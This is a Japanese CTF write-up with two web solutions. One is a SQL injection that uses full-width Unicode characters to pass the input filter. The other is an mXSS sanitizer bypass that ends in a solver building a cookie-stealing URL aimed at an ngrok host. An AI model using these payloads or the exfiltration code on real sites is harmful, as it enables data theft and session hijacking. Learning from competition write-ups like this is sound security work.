---
title: "World Wide CTF 2024 - writeup"
date: "2024-12-02T00:00:00.000Z"
lang: JA
---

![](/assets/blog/wwctf/1.png)

SECCONが終わり、「次の目標どうしようか」「他のチームでもプレイしてみたいな」と悩んでいたところ、先日ctfguyさんに新チームInfobahnに参加しないか、と誘ってただきました。

というわけで、デビュー戦のWorld Wide CTF 2024に後半だけですが参加しました。そうしたらなんと優勝しました！！！すごすぎる！！！(僕自身はあまり貢献できていませんが)

前のチームより人数も多いし、全体的にレベルがすごく高くてついていけるか不安ですが、いろいろ知識を吸収して少しでも活躍できるように成長していきたいです。

私が解いた一問と、主に他のチームメイトが解いた一問のwriteupです。


## ✅ World Wide Email (480pts 7 solves)

※すでにサイトが閉じてしまったので、細かい箇所はあまり覚えていません...残念

Eメールを入力して、そのEメールに対するメッセージを表示してくれるサイト。ソースコードなし。

いろいろな入力を試してみて、どのような反応があるか試した。(メッセージの詳細は忘れたので、[Orelさんのwriteup](https://www.thesecuritywind.com/post/world-wide-ctf-2024-world-wide-email-search-web)を参考にしました。)

* `aaa` - 「Invalid email address」
    * アドレスの形式のチェックがある
* `a@b.com` - 「No message found for email a@b.com」
* `admin@wwctf.com` - 「Found message for email: Welcome back admin!」
    * なにかしらデータを保存している箇所はありそう
* `adm-in@wwctf.com` - 「Invalid email address」
    * [RFC的には許可されてるはず](https://ja.wikipedia.org/wiki/%E3%83%A1%E3%83%BC%E3%83%AB%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9)?
    * 他にも禁止されている文字が多い
* `admin@w'wctf.com` - 「Found message for email: Welcome back admin!」
    * 他の文字と違って取り除かれている？
    * 取り除かなければならないということは、なにかしらのインジェクションの対策か？
    * `"`も同様
* `aｄmin@wwctf.com`(`d`が全角) - 「Found message for email: Welcome back admin!」
    * ユニコード文字を似たascii文字に変換している？
* `a’dmin@wwctf.com`(`'`が全角) - 「Error: near "dmin": syntax error」
    * インジェクションに成功してるか？
* `’OR’’＝’’ーーdmin@wwctf.com` - 「Found message for email: Welcome back admin!」
    * SQLインジェクションだ！

あとは、ごく一般的なSQLインジェクションの手法に従えばよい。

* [PayloadAllTheThingのDBMS Identification](https://www.thesecuritywind.com/post/world-wide-ctf-2024-world-wide-email-search-web)を参考に、データベースの特定を行う
    * `’OR/**/conv（’a’，16，2）＝conv（’a’，16，2）ーーdmin@wwctf.com`
        * エラー → MySQLではない
    * `’OR/**/pg_client_encoding（）＝pg_client_encoding（）ーーdmin@wwctf.com`
        * エラー → PostgreSQLではない
    * `’OR/**/sqlite_version（）＝sqlite_version（）ーーdmin@wwctf.com`
        * 「Found message for email: Welcome back admin!」→ SQLiteで確定
* [PayloadAllTheThingのSQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)を参考に、テーブルの一覧を取得する
    * `’/**/UNION/**/SELECT/**/sql/**/FROM/**/sqlite_masterーーdmin@wwctf.com` - テーブル名が`flagz`、カラム名が`flag`であることが判明
* `’/**/UNION/**/SELECT/**/flag/**/FROM/**/flagzーー@wwctf.com` - フラグ入手

実際は以下のようなツールを作成し、効率よく問い合わせを行った

```python:solver.py
import requests

URL = "https://emailsearch.wwctf.com/"

s = requests.session()

email = "' UNION SELECT flag FROM flagz--@wwctf.com"

email = email.replace("'", "’")
email = email.replace("-", "ー")
email = email.replace("=", "＝")
email = email.replace(" ", "/**/")
email = email.replace("(", "（")
email = email.replace(")", "）")
email = email.replace(",", "，")
email = email.replace(":", "：")
data = {
    "email": email
}
r = s.get(URL, params=data)
print(r.text)
print(r.url)
```


## ✅ SAAS (497pts 2 solves)

9割9分bawolffさんが解きました。すげー！

### 問題概要

HTMLを送信すると、サニタイズして表示するサイト。

![](/assets/blog/wwctf/2.png)

フロントエンドのコードは次の通り。クエリパラメータからHTMLを読み取り、それが**75文字以下**ならば、`/api/sanitize`でサニタイズした後`#sanitized-output`の`innerHTML`に代入する。

```javascript:index.js
async function sanitizeHTML() {
    const inputHTML = document.getElementById('html-input').value;
    if (inputHTML.length <= 75) {
        try {
            const response = await fetch('/api/sanitize', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ html: inputHTML })
            });

            const data = await response.json();

            if (data.html) {
                document.getElementById('sanitized-output').innerHTML = data.html;
            } else {
                document.getElementById('sanitized-output').textContent = `Error: ${data.error}`;
            }
        } catch (err) {
            document.getElementById('sanitized-output').textContent = `Failed to sanitize HTML: ${err.message}`;
        }
    } else {
        document.getElementById('sanitized-output').innerHTML = "<h1>Too Long</h1>";
    }
}
/* snap */
window.onload = () => {
    const urlParams = new URLSearchParams(window.location.search);
    const base64HTML = urlParams.get('html');
    if (base64HTML) {
        const decodedHTML = decodeURIComponent(escape(atob(base64HTML)));
        document.getElementById('html-input').value = decodedHTML;
        sanitizeHTML();
    }
}
```

`/api/sanitize`の実装は以下の通り。[cheerio](https://github.com/cheeriojs/cheerio)というパーサーを利用してHTMLをパースした後、禁止されているタグ(`blacklist`)と、禁止されているイベント(`attrs`)をすべて取り除く。

```javascript:app.js
const sanitize = (html) => {
    const unsafe = cheerio.load(html);
    for (const tag of blacklist) {
        unsafe(tag, "body").remove();
    }
    unsafe('*').each((_, el) => {
        for (const attr of attrs) {
            unsafe(el).removeAttr(attr);
        }
    });
    return unsafe("body").html();

}
/* snap */
app.post('/api/sanitize', async (req, res) => {
    try {
        const { html } = req.body;
        if (html) {
            const sanitizedHTML = sanitize(html);
            res.json({ html: sanitizedHTML });
        } else {
            res.status(400).json({ error: 'No HTML provided' });
        }
    } catch (err) {
        console.log(err)
        res.status(500).json({ error: 'Something went wrong' });
    }
});
```

`blacklist`と`attr`は次の通り。

```javascript
const blacklist = "a abbr acronym address applet area article aside audio b base bdi bdo big blink blockquote br button canvas caption center cite code col colgroup command content data datalist dd del details dfn dialog dir div dl dt element em embed fieldset figcaption figure font footer form frame frameset head header hgroup hr html iframe image img input ins kbd keygen label legend li link listing main map mark marquee menu menuitem meta meter multicol nav nextid nobr noembed noframes noscript object ol optgroup p output p param picture plaintext pre progress s samp script section select shadow slot small source spacer span strike strong sub summary sup svg table tbody td template textarea tfoot th thead time tr track tt u ul var video".split(" ")

const attrs = "onafterprint onafterscriptexecute onanimationcancel onanimationend onanimationiteration onanimationstart onauxclick onbeforecopy autofocus onbeforecut onbeforeinput onbeforeprint onbeforescriptexecute onbeforetoggle onbeforeunload onbegin onblur oncanplay oncanplaythrough onchange onclick onclose oncontextmenu oncopy oncuechange oncut ondblclick ondrag ondragend ondragenter ondragexit ondragleave ondragover ondragstart ondrop ondurationchange onend onended onerror onfocus onfocus onfocusin onfocusout onformdata onfullscreenchange onhashchange oninput oninvalid onkeydown onkeypress onkeyup onload onloadeddata onloadedmetadata onloadstart onmessage onmousedown onmouseenter onmouseleave onmousemove onmouseout onmouseover onmouseup onmousewheel onmozfullscreenchange onpagehide onpageshow onpaste onpause onplay onplaying onpointercancel onpointerdown onpointerenter onpointerleave onpointermove onpointerout onpointerover onpointerrawupdate onpointerup onpopstate onprogress onratechange onrepeat onreset onresize onscroll onscrollend onsearch onseeked onseeking onselect onselectionchange onselectstart onshow onsubmit onsuspend ontimeupdate ontoggle ontoggle(popover) ontouchend ontouchmove ontouchstart ontransitioncancel ontransitionend ontransitionrun ontransitionstart onunhandledrejection onunload onvolumechange onwebkitanimationend onwebkitanimationiteration onwebkitanimationstart onwebkitmouseforcechanged onwebkitmouseforcedown onwebkitmouseforceup onwebkitmouseforcewillbegin onwebkitplaybacktargetavailabilitychanged onwebkittransitionend onwebkitwillrevealbottom onwheel".split(" ")
```

URLを送るとCookieにフラグを持ったbotが訪れてくれるので、そのcookieを盗むことが最終目標となる

### 解法

まずは、禁止されていないタグを特定した。cheerioが利用しているparse5のコードの[タグのリスト](https://github.com/inikulin/parse5/blob/561fe0c84cc9efae712f9e27495704c0afcbc4a2/packages/parse5/lib/common/html.ts#L33)と比較する。そうすると、以下のタグが許可されていることが分かった。

```
"annotation-xml","basefont","bgsound","body","desc","foreignObject","h1","h2","h3","h4","h5","h6","i","malignmark","math","mglyph","mi","mo","mn","ms","mtext","option","rb","rp","rt","rtc","ruby","search","style","title","wbr","xmp"
```

`math`タグとそれに付随するタグの多くが許可されていることがわかる。また、cheerioは不明なタグをカスタムタグとして扱うが、カスタムタグは取り除かれないのでそれらも利用できる。

次に、許可されたイベントを見てみる。`for(let a in window) if(a.startswith("on"))console.log(a)`をブラウザで実行して、それと比較した。

```
"onappinstalled","onbeforeinstallprompt","onbeforexrselect","onabort","onbeforematch","oncancel","oncontentvisibilityautostatechange","oncontextlost","oncontextrestored","onemptied","onsecuritypolicyviolation","onslotchange","onstalled","onwaiting","ongotpointercapture","onlostpointercapture","onlanguagechange","onmessageerror","onoffline","ononline","onrejectionhandled","onstorage","ondevicemotion","ondeviceorientation","ondeviceorientationabsolute","onpageswap","onpagereveal","onscrollsnapchange","onscrollsnapchanging"
```

[PortSwiggerのXSSチートシート](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)を見ながら、使えそうなイベントはないかと探ると、いくつか使えそうなペイロードが見つかった。ただし、いずれも75文字という文字数制限内では有効ではなかった。

```html
<x oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>
```

```html
<h1 onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><math style=scroll-snap-align:center>
```

上記を短くしようと試行錯誤していたが、bawolffさんが次のペイロードが刺さることを発見した。後で聞いたところ、[mxss examples](https://sonarsource.github.io/mxss-cheatsheet/examples/)を元にいろいろなペイロードを試していたところ刺さったらしい。

```html
<math><mi><table><mglyph><xmp><mi><iframe onload=alert(1)>
```

::: details なぜこれが刺さるのか？

[参考: mXSS cheatsheet](https://sonarsource.github.io/mxss-cheatsheet/)

HTMLにはnamespaceという概念があり、あるタグ内がどのような仕様に基づいて処理されるべきかを定義する。デフォルトのnamespaceはHTMLであり、HTMLのタグのルールに従って処理されるが、HTML以外にSVGとMATHMLの２つがXML形式をもつnamespaceとして利用できる。

Namespaceを切り替えるタグを「integration point」と呼ぶ。例えば、HTML namespaceで利用できるSVG integration pointは`<svg>`タグであり、内部はSVG namespaceとして処理される。同様にHTML namespaceで利用できるMATHML integration pointは`<math>`タグである。

MATHML namespace内で利用できるタグのうち、今回利用したタグは次のような特性をもつ。
* `<mi>` - HTML integration point
* `<mglyph>` - HTML integration point**直下**にある場合、MATHML integration pointとなる。

別の話になるが、`<table>`タグには許可されないタグが直下に存在する場合、**その要素をタグの直前に移動する**という仕様がある。(例: `<table><a>foobar</a></table>`→ `<a>foobar</a><table></table>`)

以上を元に最初のペイロードがどのように処理されるかを確認する。(以下はcheerioでもブラウザでも同様に処理される)

1. パーサーは次のように解釈する(`<xmp>`は内部をテキストとして扱うことに注意)。`<mglyph>`は`<mi>`の直下にないため、MATHML integration pointとして機能しない。
    <div class="code-block-container"><pre class="language-html"><code class="language-html code-line" data-line="223"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML:math</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MATHML:mi</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML:table</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML:mglyph</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML:xmp</span><span class="token punctuation">&gt;</span></span>
                        &lt;mi&gt;&lt;iframe onload=alert(1)&gt; <span class="token comment">// テキスト</span>
    </code></pre></div>

2. `<mglyph>`は`<table>`内で許可された要素ではないため、`<mglyph>`を外に移動させる。
    <div class="code-block-container"><pre class="language-html"><code class="language-html code-line" data-line="232"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML:math</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MATHML:mi</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML:mglyph</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML:xmp</span><span class="token punctuation">&gt;</span></span>
                    &lt;mi&gt;&lt;iframe onload=alert(1)&gt; <span class="token comment">// テキスト</span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML:table</span><span class="token punctuation">&gt;</span></span>
    </code></pre></div>

3. 閉じタグなどを補完する
    <div class="code-block-container"><pre class="language-html"><code class="language-html code-line" data-line="241"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mi</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xmp</span><span class="token punctuation">&gt;</span></span>
                    &lt;mi&gt;&lt;iframe onload=alert(1)&gt; <span class="token comment">// テキスト</span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xmp</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mi</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">&gt;</span></span>  
    </code></pre></div>

4. 禁止タグが取り除かれる
    <div class="code-block-container"><pre class="language-html"><code class="language-html code-line" data-line="241"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>math</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mi</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>mglyph</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xmp</span><span class="token punctuation">&gt;</span></span>
                    &lt;mi&gt;&lt;iframe onload=alert(1)&gt; <span class="token comment">// テキスト</span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xmp</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mi</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">&gt;</span></span>  
    </code></pre></div>

サニタイズされた結果は次のようになる。ここで、**`<mglyph>`が`<mi>`の直下になっていることに注目する。**
```html
<math><mi><mglyph><xmp><mi><iframe onload=alert(1)></xmp></mglyph></mi></math>
```

上記がブラウザでは次のように解釈される。ここで、`xmp`はMATHML namespaceではカスタムタグとして扱われることに注意する。

<div class="code-block-container"><pre class="language-html"><code class="language-html code-line" data-line="272"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML:math</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MATHML:mi</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML:mglyph</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MATHML:xmp</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>MATHML:mi</span><span class="token punctuation">&gt;</span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML:iframe</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">&gt;</span></span>   
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xmp</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mglyph</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>mi</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>math</span><span class="token punctuation">&gt;</span></span>
</code></pre></div>

根本的な原因は、cheerioがサニタイザーではなく、あくまでDOMパーサーであるという点である。DOMパーサーは、仮にすべて仕様通りに正しく解釈しその結果を出力したとしても、出力した結果を再度解釈すると以前と解釈が異なってしまうケースがある。

:::


さて、XSSは成功したが残りのコードは25文字以内に収める必要がる。`"fetch('//0.0.0.0/'+document.cookie)"`のようなコードでも25文字を余裕で超えてしまうため、cookieを外部に送るコードを直接書くことは難しそうだ。

そこで、URLを好きに指定できることを利用する。
* ペイロードの`onerror`の値を`'eval("/*"+location)'`とする
* URLを`http://localhost/?x=*/alert(1)//&html=...`のようにする
* evalされる文字列は`/*http://localhost/?x=*/alert(1)//&html=...`のようになる。URLの大部分がコメントアウトされ、`alert(1)`だけが残るので、`alert(1)`が実行される。

あとは、`alert(1)`の部分をcookieを自分のサイトに送るコードに書き換えればよい。

(botが問題サイトのURLを禁止するWAFが導入されていたが、それはオリジンをURLエンコードすれば良いだけなので割愛)

### 最終的なコード

```python:solver.py

import hashlib
import time
from multiprocessing import Pool
import re
import requests
from base64 import b64encode


def find_nonce(args):
    message, nonce_start, nonce_end, prefix = args
    for nonce in range(nonce_start, nonce_end):
        combined = f'{message}{nonce}'.encode()
        hash_result = hashlib.sha256(combined).hexdigest()
        if hash_result.startswith(prefix):
            return nonce
    return None

def proof_of_work(message):
    prefix = '0'*6
    nonce = 0
    num_processes = 1
    chunk_size = 1000000
    start_time = time.time()
    
    with Pool(processes=num_processes) as pool:
        while True:
            tasks = [
                (message, nonce + i * chunk_size, nonce + (i + 1) * chunk_size, prefix)
                for i in range(num_processes)
            ]
            results = pool.map(find_nonce, tasks)
            
            for result in results:
                if result is not None:
                    end_time = time.time()
                    nonce = result
                    print(f'Time taken: {end_time - start_time} seconds')
                    return nonce

            nonce += num_processes * chunk_size

URL = "https://saas.wwctf.com"
URL = "http://localhost/"
EVIL = "https://tchenio.ngrok.io/"

s = requests.session()
r = s.get(URL + "api/report")
data = re.findall(r'data = "(.+)"', r.text)[0]
nonce = proof_of_work(data)

payload = f"document.location.assign('{EVIL}'+document.cookie)"
payload = f"eval(atob(/{b64encode(payload.encode()).decode()}/.toString().slice(1,-1)))"

url = f"https://saas.wwctf%2ecom/?x=*/{payload}//&html=PG1hdGg%2BPG1pPjx0YWJsZT48bWdseXBoPjxzdHlsZT48bWk%2BPGlmcmFtZSBvbmxvYWQ9J2V2YWwoIi8qIitsb2NhdGlvbiknPg%3D%3D"

# botの報告は多分ドメイン指定できる環境じゃないと動かない

# r = s.post(URL + "api/report", json={
#     "data": data,
#     "nonce": nonce,
#     "urlToVisit": url,
#     "secretKey": "secret"
# })

# print(r.text)
print(url)
```